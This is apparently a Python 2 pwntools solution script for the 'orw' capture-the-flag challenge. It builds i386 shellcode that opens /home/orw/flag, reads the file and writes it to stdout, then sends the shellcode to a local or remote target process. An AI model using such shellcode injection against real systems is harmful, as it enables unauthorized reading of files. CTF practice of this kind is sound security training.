#!/usr/bin/env python2

from pwn import *
from qpwn import *
from sys import argv
context(os='linux', log_level='debug')
context.arch = 'i386'
context.terminal = ['tmux', 'splitw', '-h']

if args.INFO:
    context.log_level = 'info'
    
DEBUG = not args.REMOTE and not args.TEST
if args.REMOTE:
    p = remote(argv[1], int(argv[2]))
elif args.TEST:
    p = process('./pwn', env={'LD_PRELOAD': './libc.so.6'})
else:
    p = process('./pwn')
elf = ELF('./pwn')
init(p, elf, context, args)
make_alias(p)

if __name__ == '__main__':
    addr = 0x0804A800
    sc = shellcraft.open('/home/orw/flag', 0, 0) + shellcraft.read(3, addr, 0x100) + shellcraft.write(1, addr, 0x100)
    print len(asm(sc))
    p.s(asm(sc))
    p.i()
